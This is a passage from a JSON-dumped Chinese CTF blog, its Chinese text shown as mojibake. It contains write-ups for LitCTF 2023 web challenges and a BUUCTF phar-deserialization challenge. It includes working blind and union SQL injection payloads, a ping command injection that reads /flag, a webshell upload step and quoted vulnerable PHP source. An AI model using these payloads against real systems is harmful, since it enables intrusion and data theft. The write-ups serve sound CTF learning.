#çˆ†è¡¨ï¼šif(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),{},1))>{},1,0)\n        #çˆ†å­—æ®µï¼šif(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),{},1))>{},1,0)\n        #çˆ†æ•°æ®ï¼šif(ascii(substr((select(value)from(ctf.flag)),{},1))>{},1,0)\n        r = requests.get(url=url,params=paylaod)\n        if (\"admin\" in r.text):\n            low = mid+1\n            mid = (low+high)//2\n        else:\n            high = mid-1\n            mid = (low+high)//2\n    result+=chr(high+1)\n    print(result)\n    time.sleep(0.3)\n```\n\nå½“ç„¶ä¹Ÿå¯ä»¥ç”¨å¼‚æˆ–æ¥æ³¨å…¥\n\npayloadï¼š\n\n```python\n0^(ascii(substr(database(),1,1))>97) #çˆ†åº“\n0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),1,1))>97)  #çˆ†è¡¨\n0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),1,1))>97)  çˆ†å­—æ®µ\n0^(ascii(substr((select(value)from(ctf.flag)),1,1))>97)  #çˆ†æ•°æ®\n```\n\n# \n","tags":["sqlæ³¨å…¥","sql bypass"],"categories":["buuctf"]},{"title":"LitCTF 2023 ï¼ˆå…¬å¼€èµ›é“ï¼‰WEBæ–¹å‘WP","url":"/post/d4be732.html","content":"\nLitCTF 2023ï¼ˆå…¬å¼€èµ›é“ï¼‰WEBæ–¹å‘WP\n\n<!--more-->\n\næ•´ä½“webéƒ½å¾ˆç®€å•ï¼Œè¿™æ¬¡ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡akæ‰€æœ‰webé¢˜ç›®ï¼Œæ€»æ’å50/1148ï¼Œè¢«å®éªŒå®¤å…¶ä»–æ–¹å‘çš„ğŸ‘´å¸¦é£ï¼Œkeep onï¼\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684072731861-f783aba7-d561-4ec5-9c20-54d781cf52a8.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684072940858-74566b6d-dc39-4dec-8464-fad26ec85492.png)\n\n# Web\n\n## æˆ‘Flagå‘¢ï¼Ÿï¼ˆå½©è›‹ä¸€ï¼‰\n\næŸ¥çœ‹æºç çˆ†flag\n\nF12 å½©è›‹ï¼Œä½†æ˜¯å½“æ—¶æ˜¯é€šè¿‡ç¿»æºç ç¿»å‡ºæ¥çš„ï¼Œéº»äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684033668164-5d2df6ff-3ad1-4ede-b6ad-1d886d55d3be.png)\n\n```\nLitCTF{First_t0_The_k3y! (1/?)\n```\n\n## å¯¼å¼¹è¿·è¸ª\n\næŸ¥çœ‹`game.js`æºç  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684037425180-3556324f-76ff-4d4b-97a6-a55708600309.png)\n\n## Follow me and hack meï¼ˆå½©è›‹ä¸‰ï¼‰\n\nåæ¥å¤ç°çš„æ—¶å€™æ‰å‘ç°è¿™é“é¢˜æŠŠæäº¤æŒ‰é’®banäº† å½“æ—¶åšçš„æ—¶å€™ç›´æ¥ç”¨hackbaræäº¤çš„ ä¹Ÿæ˜¯å·äº†ä¸€ä¸ªä¸€è¡€:)\n\npayload: `?CTF=Lit2023`  ç„¶åpostä¸€ä¸ª`challenge=i'm_c0m1ng`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684034356003-a989e1f1-6d35-43c3-ab50-0d2e8cb88a0c.png)\n\næç¤ºæœ‰å¤‡ä»½æ–‡ä»¶ `/www.zip`ä¸‹è½½ä¸€ä¸ªæºç  é‡Œé¢æœ‰å½©è›‹ä¸‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684034464808-7c54d155-8a9d-491a-8e96-1c3f34953e76.png)\n\n```\n_R3ady_Pl4yer_000ne_ (3/?)\n```\n\n## PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼ï¼\n\nå†™ä¸ªphpä»£ç å°±è¡Œäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684034610396-b824eee6-a816-499c-b8be-41f084568a19.png)\n\n## Vim yyds\n\nvim å¹¶ä¸”é¢˜ç›®æç¤ºæ¼äº† å°±æƒ³åˆ°æ˜¯vimä¸æ­£å¸¸é€€å‡ºå¯¼è‡´çš„swpæ–‡ä»¶æ³„éœ² å½“æ—¶è®°å¾—æ˜¯åœ¨ctfshowåˆ·é¢˜åˆ·åˆ°çš„\n\n`.index.php.swp` ä¸‹è½½ä¸€ä¸ªæ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684034859095-af36e824-ba42-4bb6-a80e-efeab4e86f97.png)\n\nç„¶åè¿™é‡Œçœ‹äº†å¤§ä½¬çš„wp æ‰çŸ¥é“ vim -rå¯ä»¥æ¢å¤æºç  tql\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684248441738-52d569f2-6bcb-47a5-8fbb-e1c05b344685.png)\n\n```php\n<html>\n\n<head>\n    <meta charset=\"UTF-8\">\n    <style type=\"text/css\">\n        body,\n        html {\n            display: flex;\n            align-items: center;\n            justify-content: center;\n        }\n\n        div.vim {\n            display: flex;\n            align-content: center;\n            vertical-align: middle;\n            justify-content: center;\n        }\n\n        img {\n            border: none;\n            width: 8rem;\n            height: auto;\n        }\n\n        h1.vim_yyds {\n            color: #50f728;\n            display: flex;\n            align-items: flex-start;\n            justify-content: center;\n            margin-top: 50;\n            margin-left: 5px;\n        }\n\n        h3.vim_said {\n            color: #39c2ff;\n            display: flex;\n            justify-content: center;\n            align-items: center;\n        }\n\n        br,\n        p {\n            font-size: 20;\n        }\n    </style>\n</head>\n\n<body>\n    <main>\n        <div class=\"vim\">\n            <img src=\"https://www.bing.com/th?id=OSAAS.7B95FA2D97CE022F5E7949F60E350A25&pid=TechQna\"></img>\n            <h1 class=\"vim_yyds\">\n                Vim yyds\n            </h1>\n        </div>\n        <h3 class=\"vim_said\">\n            é˜Ÿé‡Œå¸ˆå‚…è¯´Vimæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„ç¼–è¾‘å™¨ï¼Œä¸æ¥å—åé©³\n        </h3>\n        <div class=\"can_can_vim\">\n            <?php\n            error_reporting(0);\n            $password = \"Give_Me_Your_Flag\";\n            echo \"<p>can can need Vim </p>\";\n            if ($_POST['password'] === base64_encode($password)) {\n                echo \"<p>Oh You got my password!</p>\";\n                eval(system($_POST['cmd']));\n            }\n            ?>\n        </div>\n    </main>\n</body>\n```\n\npostä¸€ä¸ªcmdå‘½ä»¤æ‰§è¡Œ å¹¶ä¸”passwordè¦ç­‰ä¸base64åŠ å¯†åçš„password ä¼ å‚å³å¯\n\n## ä½œä¸šç®¡ç†ç³»ç»Ÿ(å½©è›‹äºŒ)\n\næŸ¥çœ‹æºç æ˜¾ç¤ºç”¨æˆ·åå¯†ç éƒ½æ˜¯admin\n\nç„¶åä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬    `/æœ¨é©¬`è®¿é—®å°±è¡Œäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684035114439-8aede763-cfc9-49f0-b85e-a884b143cb74.png)\n\nç„¶ååœ¨è¿™é‡Œèƒ½çœ‹åˆ°ä¸€ä¸ªgithubé“¾æ¥ ç‚¹è¿›å»å°±æ˜¯ç¬¬äºŒä¸ªå½©è›‹  `_S0_ne3t? (2/?)`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684035147381-e408d351-3515-4d0e-80b4-9c75a70f25a0.png)\n\n## è¿™æ˜¯ä»€ä¹ˆï¼ŸSQL ï¼æ³¨ä¸€ä¸‹ ï¼ï¼ˆå½©è›‹å››ï¼‰\n\nè¿™ä¸ªé¢˜ç›®çœŸç»™è‡ªå·±æ— è¯­ä½äº† ä¸€å¼€å§‹ç”¨1ï¼Œ2éƒ½æœ‰æ­£å¸¸å›æ˜¾ å…¶ä»–éƒ½æ²¡æœ‰å›æ˜¾ ä»¥ä¸ºæ˜¯ç›²æ³¨ æ³¨äº†åŠå¤©è¿˜æ³¨å‡ºæ¥äº†  å‘ç°é‡Œé¢æ²¡æœ‰flagè¡¨å’Œå­—æ®µ å°±æ„Ÿè§‰è‡ªå·±åšé”™äº†\n\nå›å¤´çœ‹çœ‹ å‘ç°æ˜¯ç®€å•çš„è”åˆæ³¨å…¥ çœŸæ— è¯­ä½äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684035351491-b625f56a-6681-4d95-86fb-15c72d1cbae9.png)\n\næ ¹æ®é¢˜ç›®æ˜¯sqlè¯­å¥é—­åˆæ˜¯`))))))`\n\npayload:\n\nçˆ†æ•°æ®åº“ï¼š\n\n```\n1)))))) union  select 1,group_concat(schema_name) from information_schema.schemata#\ninformation_schema,mysql,ctftraining,performance_schema,test,ctf\n```\n\nçˆ†è¡¨ï¼š\n\n```\n1)))))) union select 2,group_concat(table_name) from information_schema.tables where table_schema='ctftraining'#\nflag,news,users\n```\n\nçˆ†å­—æ®µï¼š\n\n```\n1)))))) union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'#\nflag\n```\n\nçˆ†æ•°æ®ï¼š\n\n `1)))))) union select 1,flag from ctftraining.flag#`\n\næœ€åä¸€ä¸ªç¨å¾®æœ‰ç‚¹å‘ æ˜¯æˆ‘ä¸äº†è§£çš„çŸ¥è¯†ç‚¹ ä¹‹å‰è”åˆæ³¨å…¥éƒ½æ˜¯æ¯”å¦‚ `select flag from flag` æ²¡æœ‰é™å®šæ•°æ®åº“\n\nå¯¼è‡´å½“æ—¶åšè¿™é“é¢˜ç›®æ—¶å€™ä¸€ç›´æ²¡æ³¨å‡ºæ¥ éº»äº†äºº\n\nè¿™é‡Œè¦é™å®šä¸€ä¸‹æ•°æ®åº“ç„¶åå†åŠ ä¸Šè¡¨å `ctftraining.flag` åˆå­¦åˆ°äº†\n\n\n\nç„¶åè¾“å…¥2 å°±æ˜¯ç¬¬å››ä¸ªå½©è›‹äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684035939663-eeb7c294-4ece-44ca-bc2a-4307cf2595c8.png)\n\n```\nF1rst_to_Th3_eggggggggg!} (4/4)\n```\n\n## Http pro max plus\n\n`User-Agent: Chrome` è¿™é‡Œè¦æŠŠå…¶ä»–çš„åˆ å…‰åªç•™è¿™ä¸ª å½“æ—¶é—®äº†ä¸€ä¸‹å‡ºé¢˜äºº\n\n```\nclient-ip: 127.0.0.1\nreferer: pornhub.com\n```\n\n`Via: Clash.win`è¿™æ˜¯æˆ‘å­¦åˆ°çš„æ–°çŸ¥è¯†     Viaå¤´éƒ¨åˆ—å‡ºä»å®¢æˆ·ç«¯åˆ° OCS æˆ–è€…ç›¸åæ–¹å‘çš„å“åº”ç»è¿‡äº†å“ªäº›ä»£ç†æœåŠ¡å™¨\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684036183348-620dc01a-1469-4042-bc7c-178bc11d707b.png)\n\nä¹‹åè·å¾—ä¸€ä¸ªæ–°è·¯ç”±\n\n```\n/wtfwtfwtfwtf.php\n```\n\næŸ¥çœ‹æºç `/sejishikong.php` è·å¾—flag\n\n\n\n## Ping\n\nå‘ç°é™¤äº†127.0.0.1ä»¥å¤–å…¶ä»–éƒ½ä¼šè¢«æ‹¦æˆª å¹¶ä¸”æ˜¯å‰ç«¯æ‹¦æˆª ç›´æ¥jsç¦ç”¨\n\n```\n127.0.0.1|cat /flag\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684036599778-78cb6936-8433-497b-9f16-d17f2cf50026.png)\n\n## 1zjs\n\nè¿™é“é¢˜ æˆ‘æ„¿ç§°ä¹‹ä¸ºæˆ‘æ˜¯ç»ˆæçœ¼ç\n\nå»ç¿»äº†å¥½å¤šæ¬¡æºç  çœ¼çæ²¡çœ‹åˆ° ç”šè‡³æƒ³è¿‡åŸå‹é“¾æ±¡æŸ“  \n\næœ€åä¸€æ¬¡å»çœ‹æºç  ä¸€çœ¼ä¸çœŸ å°±è—åœ¨æœ€å¼€å§‹çš„åœ°æ–¹ æˆ‘çœŸè¯¥æ­»\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684036747062-88a40a10-6869-43f6-9d6e-c87a50cb22a5.png)\n\nè®¿é—® `/f@k3f1ag.php`è·å¾—ä¸€ä¸²jsfuckç \n\nåœ¨consoleä¸­æ‰“å…¥å°±èƒ½å¾—åˆ°flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684036805391-53d257b5-636b-4015-8b98-88c2ce3351e4.png)\n\n## å½©è›‹\n\nä»ä¸Šé¢é¢˜ç›®å„è·å–ä¸€éƒ¨åˆ† æ‹¼èµ·æ¥å³å¯`NSSCTF{First_t0_The_k3y!_S0_ne3t?_R3ady_Pl4yer_000ne_F1rst_to_Th3_eggggggggg!}`\n\n## å°±å½“æ— äº‹å‘ç”Ÿ\n\næ„Ÿè§‰è¿™é“é¢˜ç›®ä¸æ˜¯ä¸€ä¸ªwebé¢˜ç›® çº¯çº¯çš„ç¤¾å·¥é¢˜ç›®\n\næ‰¾åˆ°githubåšå®¢ä»“åº“ ç„¶åå»çœ‹åšå®¢ä»“åº“åˆ†æ”¯çš„commitæäº¤\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684037606894-c0770701-9d8d-488a-8fa1-3c7a7561dc65.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684037619054-3eb302ae-5d2c-4ef8-9799-c962b8176c72.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684037636268-0e531107-6615-480e-970b-9ec0d7e05150.png)\n\n\n\n## Flagç‚¹å‡»å°±é€ï¼\n\nè¿™é¢˜å§ ä¸æƒ³è¯´å•¥ ä¸€çœ¼ä¸çœŸå°±ä»¥ä¸ºsessionä¼ªé€  ä½†æ˜¯æ²¡æœ‰ç»™åˆ°å…·ä½“çš„keyçš„ä¿¡æ¯æˆ–è€…æš—ç¤º ç„¶åæƒ³è¿‡æ¨¡æ¿æ³¨å…¥ä¹Ÿéƒ½ä¸æ˜¯ ç”šè‡³æƒ³åˆ°xsså»è·å–admin session\n\næœ€åå‘ç° key å°±æ˜¯ `LitCTF`  ã€‚ã€‚\n\næœ€åsessionä¼ªé€  è®¿é—®`/flag`å³å¯\n","tags":["flask sessionä¼ªé€ ","js","sqlæ³¨å…¥","vim"],"categories":["å„èµ›äº‹WP"]},{"title":"buuctf-76-[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox","url":"/post/fb6927e0.html","content":"\n[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox\n\n<!--more-->\n\nä¸€é“ç»å…¸çš„phar ååºåˆ—åŒ–é¢˜ç›®\n\næ³¨å†Œä¸€ä¸ªè´¦å·ç„¶åç™»å½•\n\nå‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683716402325-7c52d9d0-9c71-4709-ba00-3c1b57bc054f.png)\n\nä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ä¸Šä¼ æœ¨é©¬ å½“ç„¶ä¸å¯èƒ½ buuç¬¬ä¸‰é¡µçš„é¢˜ç›®ä¸å¯èƒ½è¿™ä¹ˆç®€å•\n\nç„¶åä¸‹è½½æˆ‘ä»¬ä¸Šä¼ ä¸Šå»çš„æ–‡ä»¶\n\n![image.png](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683716516171-45a1f1e3-ceb9-45b2-8b61-098e3e6ff05b.png)\n\nå‘ç°é€šè¿‡/download è¯·æ±‚äº†`filename=`æ¥å®ç°ä¸‹è½½\n\nè¿™é‡Œå­˜åœ¨æ–‡ä»¶ä»»æ„è¯»æ¼æ´\n\næ„é€ `paylaod:filename=../../æ–‡ä»¶`å¯ä»¥å¾—åˆ°å¾ˆå¤šæºç \n\nå…±èƒ½ä¸‹åˆ°7ä¸ªphpæ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683716726355-fa8d5653-be99-429d-9775-279dbf7347d9.png)\n\næ¥ä¸‹æ¥å°±æ˜¯æ¼«é•¿çš„ä»£ç å®¡è®¡äº†\n\n## å®¡è®¡ï¼š\n\né¦–å…ˆ login.phpä¸register.phpéƒ½æ˜¯å¾ˆå¸¸è§„çš„åˆå¤„ç† ä¸å¤šè¯´\n\nç„¶åæ˜¯uplaod.phpä¹Ÿæ˜¯ä¸€äº›å¸¸è§„çš„æ£€æŸ¥ä¸Šä¼ æ–‡ä»¶åˆæ³•ä¸å¦çš„è¯­å¥\n\n```php\nuplaod.php\n<?php\n  session_start();\nif (!isset($_SESSION['login'])) {\n  header(\"Location: login.php\");\n  die();\n}\n\ninclude \"class.php\";\n\nif (isset($_FILES[\"file\"])) {\n  $filename = $_FILES[\"file\"][\"name\"];\n  $pos = strrpos($filename, \".\");\n  if ($pos !== false) {\n    $filename = substr($filename, 0, $pos);\n  }\n\n  $fileext = \".gif\";\n  switch ($_FILES[\"file\"][\"type\"]) {\n    case 'image/gif':\n    $fileext = \".gif\";\n    break;\n    case 'image/jpeg':\n    $fileext = \".jpg\";\n    break;\n    case 'image/png':\n    $fileext = \".png\";\n    break;\n    default:\n    $response = array(\"success\" => false, \"error\" => \"Only gif/jpg/png allowed\");\n    Header(\"Content-type: application/json\");\n    echo json_encode($response);\n    die();\n  }\n\n  if (strlen($filename) < 40 && strlen($filename) !== 0) {\n    $dst = $_SESSION['sandbox'] . $filename . $fileext;\n    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $dst);\n    $response = array(\"success\" => true, \"error\" => \"\");\n    Header(\"Content-type: application/json\");\n    echo json_encode($response);\n  } else {\n    $response = array(\"success\" => false, \"error\" => \"Invaild filename\");\n    Header(\"Content-type: application/json\");\n    echo json_encode($response);\n  }\n}\n  ?>\n```\n\ndownload.phpä¸delete.phpä¸€èµ·çœ‹å§\n\n```php\ndownload.php\n<?php\nsession_start();\nif (!isset($_SESSION['login'])) {\n    header(\"Location: login.php\");\n    die();\n}\n\nif (!isset($_POST['filename'])) {\n    die();\n}\n\ninclude \"class.php\";\nini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\");\n\nchdir($_SESSION['sandbox']);\n$file = new File();\n$filename = (string) $_POST['filename'];\nif (strlen($filename) < 40 && $file->open($filename) && stristr($filename, \"flag\") === false) {\n    Header(\"Content-type: application/octet-stream\");\n    Header(\"Content-Disposition: attachment; filename=\" . basename($filename));\n    echo $file->close();\n} else {\n    echo \"File not exist\";\n}\n?>\ndelete.php\n<?php\nsession_start();\nif (!isset($_SESSION['login'])) {\n    header(\"Location: login.php\");\n    die();\n}\n\nif (!isset($_POST['filename'])) {\n    die();\n}\n\ninclude \"class.php\";\n\nchdir($_SESSION['sandbox']);\n$file = new File();\n$filename = (string) $_POST['filename'];\nif (strlen($filename) < 40 && $file->open($filename)) {\n    $file->detele();\n    Header(\"Content-type: application/json\");\n    $response = array(\"success\" => true, \"error\" => \"\");\n    echo json_encode($response);\n} else {\n    Header(\"Content-type: application/json\");\n    $response = array(\"success\" => false, \"error\" => \"File not exist\");\n    echo json_encode($response);\n}\n?>\n```\n\nä¸ç®¡æ˜¯åˆ é™¤è¿˜æ˜¯ä¸‹è½½è·¯ç”±éƒ½æœ‰`$file = new File();`\n\nè·Ÿè¸ªä¸€ä¸‹ åˆ°class.php ä¹Ÿæ˜¯æœ€é‡è¦çš„\n\n```php\nclass.php\n<?php\nerror_reporting(0);\n$dbaddr = \"127.0.0.1\";\n$dbuser = \"root\";\n$dbpass = \"root\";\n$dbname = \"dropbox\";\n$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);\n\nclass User {\n    public $db;\n\n    public function __construct() {\n        global $db;\n        $this->db = $db;\n    }\n\n    public function user_exist($username) {\n        $stmt = $this->db->prepare(\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\");\n        $stmt->bind_param(\"s\", $username);\n        $stmt->execute();\n        $stmt->store_result();\n        $count = $stmt->num_rows;\n        if ($count === 0) {\n            return false;\n        }\n        return true;\n    }\n\n    public function add_user($username, $password) {\n        if ($this->user_exist($username)) {\n            return false;\n        }\n        $password = sha1($password . \"SiAchGHmFx\");\n        $stmt = $this->db->prepare(\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\");\n        $stmt->bind_param(\"ss\", $username, $password);\n        $stmt->execute();\n        return true;\n    }\n\n    public function verify_user($username, $password) {\n        if (!$this->user_exist($username)) {\n            return false;\n        }\n        $password = sha1($password . \"SiAchGHmFx\");\n        $stmt = $this->db->prepare(\"SELECT `password` FROM `users` WHERE `username` = ?;\");\n        $stmt->bind_param(\"s\", $username);\n        $stmt->execute();\n        $stmt->bind_result($expect);\n        $stmt->fetch();\n        if (isset($expect) && $expect === $password) {\n            return true;\n        }\n        return false;\n    }\n\n    public function __destruct() {\n        $this->db->close();\n    }\n}\n\nclass \n  {\n    private $files;\n    private $results;\n    private $funcs;\n\n    public function __construct($path) {\n        $this->files = array();\n        $this->results = array();\n        $this->funcs = array();\n        $filenames = scandir($path);\n\n        $key = array_search(\".\", $filenames);\n        unset($filenames[$key]);\n        $key = array_search(\"..\", $filenames);\n        unset($filenames[$key]);\n\n        foreach ($filenames as $filename) {\n            $file = new File();\n            $file->open($path . $filename);\n            array_push($this->files, $file);\n            $this->results[$file->name()] = array();\n        }\n    }\n\n    public function __call($func, $args) {\n        array_push($this->funcs, $func);\n        foreach ($this->files as $file) {\n            $this->results[$file->name()][$func] = $file->$func(); #file=new File()  func=close\n        }\n    }\n\n    public function __destruct() {\n        $table = '<div id=\"container\" class=\"container\"><div class=\"table-responsive\"><table id=\"table\" class=\"table table-bordered table-hover sm-font\">';\n        $table .= '<thead><tr>';\n        foreach ($this->funcs as $func) {\n            $table .= '<th scope=\"col\" class=\"text-center\">' . htmlentities($func) . '</th>';\n        }\n        $table .= '<th scope=\"col\" class=\"text-center\">Opt</th>';\n        $table .= '</thead><tbody>';\n        foreach ($this->results as $filename => $result) {\n            $table .= '<tr>';\n            foreach ($result as $func => $value) {\n                $table .= '<td class=\"text-center\">' . htmlentities($value) . '</td>';\n            }\n            $table .= '<td class=\"text-center\" filename=\"' . htmlentities($filename) . '\"><a href=\"#\" class=\"download\">ä¸‹è½½</a> / <a href=\"#\" class=\"delete\">åˆ é™¤</a></td>';\n            $table .= '</tr>';\n        }\n        echo $table;\n    }\n}\n\nclass File {\n    public $filename;\n\n    public function open($filename) {\n        $this->filename = $filename;\n        if (file_exists($filename) && !is_dir($filename)) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    public function name() {\n        return basename($this->filename);\n    }\n\n    public function size() {\n        $size = filesize($this->filename);\n        $units = array(' B', ' KB', ' MB', ' GB', ' TB');\n        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;\n        return round($size, 2).$units[$i];\n    }\n\n    public function detele() {\n        unlink($this->filename);\n    }\n\n    public function close() {\n        return file_get_contents($this->filename);\n    }\n}\n?>\n```\n\nFileç±»ä¸­å‘ç°äº†`file_get_contents()`å¦‚æœèƒ½è°ƒç”¨ åˆ™å¯ä»¥æ–‡ä»¶åŒ…å«\n\nå¯ä»¥æ„é€ `User->db(__destruct)->File->close()`æ¥è§¦å‘ ä½†æ˜¯è¯»åˆ°çš„æ–‡ä»¶ä¸èƒ½è¾“å‡º \n\nå‘ç°è¿˜æœ‰ä¸€ä¸ªç±»FileList ä¸­æœ‰ä¸€ä¸ªé­”æœ¯æ–¹æ³• å…¶å®ä¸€èˆ¬æœ‰é­”æœ¯æ–¹æ³•çš„ç±» éƒ½ä¼šå»æ‰¾èƒ½ä¸èƒ½æ„é€ popé“¾æ¡\n\næ—¢ç„¶ä¹‹å‰æ„é€ çš„é“¾æ¡æ²¡æ³•å›æ˜¾ é‚£ä¹ˆæˆ‘ä»¬å°±è¦é€šè¿‡æ„é€ åˆ«çš„é“¾æ¡æ¥ä½¿å¾—å›æ˜¾\n\n`User->db(__destruct)->Filelist->__call->File->close()`å†é€šè¿‡Fileå‡½æ•°çš„ææ„å‡½æ•°æ¥å›æ˜¾\n\n```php\n    public function __call($func, $args) {\n        array_push($this->funcs, $func);\n        foreach ($this->files as $file) {\n            $this->results[$file->name()][$func] = $file->$func(); #file=new File()  func=close\n        }\n    }\n```\n\nå½“å¯¹è±¡è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ï¼Œå°±ä¼šè°ƒç”¨__callæ–¹æ³•\n\nå¹¶ä¸”é»˜è®¤`$func`ä¸ºä¸å­˜åœ¨å‡½æ•°å `$args`ä¸ºå‚æ•° å¹¶ä¸”ä»¥æ•°ç»„å½¢å¼\n\nç”¨ä¸€ä¸ªç®€å•çš„demoæ¥çœ‹çœ‹\n\n```php\n<?php\nclass student{\n    public $name;\n    public $age = 13;\n    public function __destruct() {\n        $this->name->close($this->age);\n    }\n}\nclass lunch{\n    public function __call($func, $args) {\n        echo $func;\n        echo \"\\n\";\n        var_dump($args);\n    }\n}\n$a = new student();\n$a->name=new lunch();\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683725787472-68c9314f-0d45-4d69-80d1-1c6c2284da57.png)\n\næ•´ä¸ªé­”æœ¯æ–¹æ³•__callè¾¾åˆ°çš„æ•ˆæœå°±æ˜¯å°†æ–‡ä»¶åŒ…å«çš„ç»“æœä¼ é€’ç»™$this->resultsäºŒç»´æ•°ç»„  å¥½è®©ææ„å‡½æ•°è¾“å‡º\n\né‚£ä¹ˆè¿™é‡Œ__callæ–¹æ³•æ˜¯æ€ä¹ˆåšåˆ°çš„å‘¢ ä¸€å¼€å§‹ä¸€ç›´ä¸æ˜ç™½è¿™é‡Œçš„åŸç† çœ‹äº†å¥½å¤šwp éƒ½æ²¡æœ‰æåŠ çº¯å±æ˜¯æˆ‘å¤ªèœäº† \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683726874036-46a75869-468b-4c9d-833c-8651d7963247.png)\n\n```\n$this->results[$file->name()][$func] = $file->$func();\n```\n\n$fileå…¶å®å°±æ˜¯æˆ‘ä»¬è¦å»æ„é€ çš„Fileå¯¹è±¡ $funcæ˜¯è¿”å›çš„closeå‡½æ•°å ä¸Šé¢çš„demoä¸­ä¹Ÿæåˆ°äº†\n\næ‰€ä»¥è¿™é‡Œå°±ç­‰ä»·ä¸º`File->close`æ˜¯è¿™æ ·è°ƒç”¨çš„\n\nå…¶ææ„å‡½æ•°å¯ä»¥å°†è¿”å›çš„ç»“æœè¿”å›\n\n```php\n    public function __destruct() {\n        $table = '<div id=\"container\" class=\"container\"><div class=\"table-responsive\"><table id=\"table\" class=\"table table-bordered table-hover sm-font\">';\n        $table .= '<thead><tr>';\n        foreach ($this->funcs as $func) {\n            $table .= '<th scope=\"col\" class=\"text-center\">' . htmlentities($func) . '</th>';\n        }\n        $table .= '<th scope=\"col\" class=\"text-center\">Opt</th>';\n        $table .= '</thead><tbody>';\n        foreach ($this->results as $filename => $result) {\n            $table .= '<tr>';\n            foreach ($result as $func => $value) {\n                $table .= '<td class=\"text-center\">' . htmlentities($value) . '</td>';\n            }\n            $table .= '<td class=\"text-center\" filename=\"' . htmlentities($filename) . '\"><a href=\"#\" class=\"download\">ä¸‹è½½</a> / <a href=\"#\" class=\"delete\">åˆ é™¤</a></td>';\n            $table .= '</tr>';\n        }\n        echo $table;\n    }\n}\n```\n\nç¨å¾®å®¡è®¡ä¸€ä¸‹å…¶å®å°±æ˜¯æŠŠresultæ•°ç»„ç»“æœèµ‹å€¼ç»™`$table` ç„¶å`echo $table;`è¾“å‡º\n\næ˜ç™½äº†æ•´ä¸ªé“¾å­ åº”è¯¥æ€ä¹ˆæ„é€ å‘¢ é¢˜ç›®åªå®¹è®¸æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ ä¸åƒæˆ‘ä»¬å¹³å¸¸åšçš„popé“¾ å»èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡è®©å…¶ååºåˆ—åŒ–\n\n## Typo3 ååºåˆ—åŒ–æ¼æ´\n\nè¯¥æ¼æ´ç”±phar://è§¦å‘\n\nå¯ä»¥ç›´æ¥å»çœ‹å¤§ä½¬çš„æ€»ç»“ï¼š\n\nhttps://xz.aliyun.com/t/2715#toc-8\n\n[https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/](https://kylingit.com/blog/ç”±phpggcç†è§£phpååºåˆ—åŒ–æ¼æ´/)\n\nè¯´è¯´æˆ‘è‡ªå·±çš„çœ‹æ³•\n\né¦–å…ˆæˆ‘ä»¬çš„pharæ–‡ä»¶èƒ½å¤Ÿä¸Šä¼ åˆ°å¯¹æ–¹æœåŠ¡å™¨ä¸Š 